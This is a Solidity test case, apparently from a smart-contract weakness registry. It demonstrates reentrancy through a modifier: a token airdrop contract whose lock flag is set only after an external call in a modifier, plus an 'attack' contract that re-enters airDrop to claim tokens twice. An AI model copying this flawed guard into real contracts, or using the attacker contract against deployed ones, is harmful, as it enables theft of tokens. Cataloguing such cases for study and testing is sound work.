/*
 * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/reentracy/modifier_reentrancy.sol
 * @author:
 * @vulnerable_at_lines: 15
 */

pragma solidity ^0.8.0;

contract ModifierEntrancy {
  mapping (address => uint) public tokenBalance;
  string constant name = "Nu Token";
  bool private locked;

  constructor() {
    locked = false;
  }

  //If a contract has a zero balance and supports the token give them some token
  function airDrop() public hasNoBalance supportsToken {
    require(!locked, "Reentrancy detected");
    locked = true;
    tokenBalance[msg.sender] += 20;
    locked = false;
  }

  //Checks that the contract responds the way we want
  modifier supportsToken() {
    require(keccak256(abi.encodePacked("Nu Token")) == Bank(msg.sender).supportsToken(), "Invalid token");
    _;
  }

  //Checks that the caller has a zero balance
  modifier hasNoBalance {
    require(tokenBalance[msg.sender] == 0, "Balance is not zero");
    _;
  }
}

contract Bank{
    function supportsToken() external pure returns(bytes32){
        return(keccak256(abi.encodePacked("Nu Token")));
    }
}

contract attack{
    bool hasBeenCalled;

    function supportsToken() external returns(bytes32){
        if(!hasBeenCalled){
            hasBeenCalled = true;
            ModifierEntrancy(msg.sender).airDrop();
        }
        return(keccak256(abi.encodePacked("Nu Token")));
    }

    function call(address token) public{
        ModifierEntrancy(token).airDrop();
    }
}